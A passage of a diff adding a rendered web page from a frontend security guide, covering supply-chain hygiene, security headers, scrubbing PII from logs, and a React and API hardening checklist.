+</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">Promise</span><span class="p">.</span><span class="nx">reject</span><span class="p">(</span><span class="nx">error</span><span class="p">);</span>
+</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a><span class="w">  </span><span class="p">}</span>
+</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a><span class="p">);</span>
+</span></code></pre></div>
+<div class="admonition warning">
+<p class="admonition-title">Don't auto-retry blindly</p>
+<p>Retrying <code>4xx</code> errors (except <code>429</code>) usually just repeats a client mistake. Only retry idempotent requests, cap the attempts, and use <strong>exponential backoff with jitter</strong> so you don't synchronize a thundering herd against an already-struggling server.</p>
+</div>
+<hr />
+<h2 id="dependency-supply-chain-hygiene">🔟 Dependency &amp; Supply-Chain Hygiene</h2>
+<p>A typical React app ships <strong>hundreds</strong> of transitive dependencies. Each is code you execute and a potential attack vector (typosquatting, hijacked maintainer accounts, malicious post-install scripts).</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># Audit for known vulnerabilities</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>npm<span class="w"> </span>audit
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>npm<span class="w"> </span>audit<span class="w"> </span>fix<span class="w">          </span><span class="c1"># apply safe fixes</span>
+</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>npm<span class="w"> </span>audit<span class="w"> </span>--production<span class="w"> </span><span class="c1"># focus on what actually ships, not devDependencies</span>
+</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>
+</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a><span class="c1"># pnpm / yarn equivalents</span>
+</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>pnpm<span class="w"> </span>audit
+</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a>yarn<span class="w"> </span>npm<span class="w"> </span>audit
+</span></code></pre></div>
+<div class="admonition tip">
+<p class="admonition-title">Lockfiles are a security control</p>
+<p><strong>Commit your lockfile</strong> (<code>package-lock.json</code> / <code>pnpm-lock.yaml</code> / <code>yarn.lock</code>). It pins exact versions and integrity hashes so a dependency can't silently change under you. In CI, install with <code>npm ci</code> (not <code>npm install</code>) so builds use the locked tree exactly.</p>
+</div>
+<div class="admonition warning">
+<p class="admonition-title">Supply-chain checklist</p>
+<ul>
+<li>Review new dependencies before adding them (downloads, maintenance, last publish, install scripts).</li>
+<li>Prefer fewer, well-maintained packages over many micro-deps.</li>
+<li>Enable automated updates with review (Dependabot / Renovate) — patch fast, but don't auto-merge majors.</li>
+<li>Be wary of post-install scripts; consider <code>--ignore-scripts</code> in CI where feasible.</li>
+<li>Pin and verify anything loaded from a CDN with <strong>Subresource Integrity (SRI)</strong>:
+  <div class="language-html highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;https://cdn.example/lib.js&quot;</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>        <span class="na">integrity</span><span class="o">=</span><span class="s">&quot;sha384-…&quot;</span> <span class="na">crossorigin</span><span class="o">=</span><span class="s">&quot;anonymous&quot;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div></li>
+</ul>
+</div>
+<hr />
+<h2 id="11-secure-http-headers">1️⃣1️⃣ Secure HTTP Headers</h2>
+<p>Most frontend hardening is delivered via <strong>response headers</strong> set by your server, CDN, or host (Netlify/Vercel config, nginx, Express <code>helmet</code>). Know what each does:</p>
+<table>
+<thead>
+<tr>
+<th>Header</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Content-Security-Policy</code></td>
+<td>Restrict script/style/connect sources — top XSS mitigation (§2)</td>
+</tr>
+<tr>
+<td><code>Strict-Transport-Security</code></td>
+<td>Force HTTPS (§4)</td>
+</tr>
+<tr>
+<td><code>X-Content-Type-Options: nosniff</code></td>
+<td>Stop MIME-sniffing that can turn data into script</td>
+</tr>
+<tr>
+<td><code>X-Frame-Options: DENY</code> / CSP <code>frame-ancestors 'none'</code></td>
+<td>Prevent clickjacking via iframing</td>
+</tr>
+<tr>
+<td><code>Referrer-Policy: strict-origin-when-cross-origin</code></td>
+<td>Limit URL/PII leakage in the <code>Referer</code> header</td>
+</tr>
+<tr>
+<td><code>Permissions-Policy</code></td>
+<td>Disable unused powerful features (camera, geolocation, …)</td>
+</tr>
+</tbody>
+</table>
+<div class="admonition tip">
+<p class="admonition-title">Use a vetted middleware</p>
+<p>On an Express/Node BFF, <a href="https://helmetjs.github.io/"><code>helmet</code></a> sets sane defaults for most of these in one line. On static hosts, configure them in your platform's headers file. Then <strong>verify</strong> the result with a header scanner (e.g. securityheaders.com) — defaults change, and a meta-tag CSP can't cover everything.</p>
+</div>
+<hr />
+<h2 id="12-logging-pii-concerns">1️⃣2️⃣ Logging &amp; PII Concerns</h2>
+<p>Frontend logging quietly leaks sensitive data if you're not careful.</p>
+<div class="admonition danger">
+<p class="admonition-title">Don't log secrets or PII to the console or to third parties</p>
+<p><code>console.log(response)</code> in production can dump tokens, emails, and personal data into the console and into any error-monitoring/analytics tool you've wired up (Sentry, LogRocket, session replay).</p>
+</div>
+<ul>
+<li><strong>Strip credentials</strong> from anything logged — tokens, <code>Authorization</code> headers, cookies, passwords.</li>
+<li><strong>Configure error monitors</strong> to scrub PII (Sentry <code>beforeSend</code>, deny-lists for fields like <code>password</code>, <code>token</code>, <code>ssn</code>).</li>
+<li><strong>Session replay tools</strong> (FullStory/LogRocket) record the DOM — <strong>mask</strong> inputs (passwords, card numbers, anything PII) so they aren't captured.</li>
+<li><strong>Don't put PII in URLs</strong> — query strings land in server logs, browser history, and the <code>Referer</code> header. Send sensitive data in the body of a POST.</li>
+<li>Remove debug <code>console.*</code> calls from production builds (lint rule / build strip).</li>
+</ul>
+<div class="language-js highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1">// Scrub before reporting to an error monitor</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="kd">function</span><span class="w"> </span><span class="nx">scrub</span><span class="p">(</span><span class="nx">obj</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">SENSITIVE</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;password&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;token&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;authorization&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;cookie&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;ssn&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;card&quot;</span><span class="p">];</span>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nb">Object</span><span class="p">.</span><span class="nx">fromEntries</span><span class="p">(</span>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="w">    </span><span class="nb">Object</span><span class="p">.</span><span class="nx">entries</span><span class="p">(</span><span class="nx">obj</span><span class="p">).</span><span class="nx">map</span><span class="p">(([</span><span class="nx">k</span><span class="p">,</span><span class="w"> </span><span class="nx">v</span><span class="p">])</span><span class="w"> </span><span class="p">=&gt;</span>
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="w">      </span><span class="nx">SENSITIVE</span><span class="p">.</span><span class="nx">some</span><span class="p">((</span><span class="nx">s</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">k</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">().</span><span class="nx">includes</span><span class="p">(</span><span class="nx">s</span><span class="p">))</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="p">[</span><span class="nx">k</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;[REDACTED]&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="p">[</span><span class="nx">k</span><span class="p">,</span><span class="w"> </span><span class="nx">v</span><span class="p">]</span>
+</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="w">    </span><span class="p">)</span>
+</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a><span class="w">  </span><span class="p">);</span>
+</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a><span class="p">}</span>
+</span></code></pre></div>
+<hr />
+<h2 id="actionable-best-practices-checklist">✅ Actionable Best-Practices Checklist</h2>
+<div class="admonition success">
+<p class="admonition-title">Ship-it security checklist for a React + API frontend</p>
+<p><strong>Transport</strong></p>
+<ul>
+<li>[ ] HTTPS everywhere; HTTP redirects to HTTPS</li>
+<li>[ ] <code>Strict-Transport-Security</code> (HSTS) enabled, ideally preloaded</li>
+<li>[ ] No mixed content</li>
+</ul>
+<p><strong>XSS</strong></p>
+<ul>
+<li>[ ] No <code>dangerouslySetInnerHTML</code> on unsanitized data</li>
+<li>[ ] DOMPurify for any user-authored HTML</li>
+<li>[ ] URL scheme allow-list for <code>href</code>/<code>src</code> (block <code>javascript:</code>)</li>
+<li>[ ] Strict CSP (no <code>'unsafe-inline'</code>/<code>'unsafe-eval'</code>), nonce/hash based</li>
+</ul>
+<p><strong>Tokens &amp; auth</strong></p>
+<ul>
+<li>[ ] Refresh token in <strong>HttpOnly + Secure + SameSite</strong> cookie</li>
+<li>[ ] Access token <strong>in memory only</strong>, short-lived</li>
+<li>[ ] <strong>No credentials in <code>localStorage</code></strong> (unless XSS risk explicitly accepted)</li>
+<li>[ ] Secure logout actually invalidates the session server-side</li>
+</ul>
+<p><strong>CSRF (cookie auth)</strong></p>
+<ul>
+<li>[ ] <code>SameSite=Lax</code>/<code>Strict</code> on auth cookies</li>
+<li>[ ] CSRF token / double-submit for state-changing requests</li>
+</ul>
+<p><strong>CORS</strong></p>
+<ul>
+<li>[ ] Exact-origin allow-list on the server (never <code>*</code> with credentials)</li>
+<li>[ ] Understood as a browser policy, <strong>not</strong> as server protection</li>
+</ul>
+<p><strong>Secrets</strong></p>
+<ul>
+<li>[ ] No secrets in the bundle; only <code>VITE_</code>/<code>NEXT_PUBLIC_</code> <em>public</em> values exposed</li>
+<li>[ ] Third-party secret keys proxied through the backend</li>
+<li>[ ] <code>.env*</code> git-ignored; production source maps restricted</li>
+</ul>
+<p><strong>Data integrity</strong></p>
+<ul>
+<li>[ ] API responses validated at runtime (Zod), not trusted as <code>any</code></li>
+<li>[ ] Server re-validates <strong>all</strong> input (client validation is UX only)</li>
+</ul>
+<p><strong>Resilience &amp; abuse</strong></p>
+<ul>
+<li>[ ] Debounce/throttle/cancel/cache to avoid self-inflicted load</li>
+<li>[ ] <code>429</code> handled with <code>Retry-After</code>; retries use backoff + jitter</li>
+</ul>
+<p><strong>Supply chain</strong></p>
+<ul>
+<li>[ ] Lockfile committed; CI uses <code>npm ci</code></li>
+<li>[ ] <code>npm audit</code> in CI; Dependabot/Renovate enabled</li>
+<li>[ ] SRI on CDN-loaded scripts</li>
+</ul>
+<p><strong>Headers &amp; logging</strong></p>
+<ul>
+<li>[ ] Security headers set (<code>helmet</code>/host config) and verified</li>
+<li>[ ] No tokens/PII in logs, console, URLs, or session replays</li>
+</ul>
+</div>
+<div class="admonition quote">
+<p class="admonition-title">The one-sentence summary</p>
+<p>The frontend protects the <strong>user</strong> (XSS, secure storage, HTTPS, no leaked PII) and behaves as a <strong>trustworthy client</strong> (validates I/O, respects rate limits, ships no secrets) — but every decision that <em>matters</em> for security is <strong>re-enforced on the server</strong>, because the client can never be trusted.</p>
+</div>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../14.6.Real-Time%20Data/" class="md-footer__link md-footer__link--prev" aria-label="Previous: 14.6.Real-Time Data">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                14.6.Real-Time Data
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../14.8.File%20Handling/" class="md-footer__link md-footer__link--next" aria-label="Next: 14.8.File Handling">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                14.8.File Handling
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2025 S.Kumar
+    </div>
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        <div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://souravkumardash.vercel.app" target="_blank" rel="noopener" title="souravkumardash.vercel.app" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 17h-8v-1c0-1.33 2.67-2 4-2s4 .67 4 2m-4-7a2 2 0 0 1 2 2 2 2 0 0 1-2 2 2 2 0 0 1-2-2 2 2 0 0 1 2-2m5-3h-8l-2-2H4c-1.11 0-2 .89-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://www.linkedin.com/in/sourav183" target="_blank" rel="noopener" title="www.linkedin.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 3a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2zm-.5 15.5v-5.3a3.26 3.26 0 0 0-3.26-3.26c-.85 0-1.84.52-2.32 1.3v-1.11h-2.79v8.37h2.79v-4.93c0-.77.62-1.4 1.39-1.4a1.4 1.4 0 0 1 1.4 1.4v4.93zM6.88 8.56a1.68 1.68 0 0 0 1.68-1.68c0-.93-.75-1.69-1.68-1.69a1.69 1.69 0 0 0-1.69 1.69c0 .93.76 1.68 1.69 1.68m1.39 9.94v-8.37H5.5v8.37z"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/Captain-Rengoku" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+      <div class="md-progress" data-md-component="progress" role="progressbar"></div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.instant.progress", "toc.follow", "navigation.top", "navigation.tabs", "navigation.tabs.sticky", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.path", "navigation.prune", "navigation.indexes", "navigation.footer", "search.suggest", "search.highlight", "search.share", "content.code.copy", "content.code.annotate", "content.tooltips"], "search": "../../assets/javascripts/workers/search.f8cc74c7.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.60a45f97.min.js"></script>
+      
+    
+  <script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
+document$.subscribe(() => { lightbox.reload() });
+</script></body>
+</html>
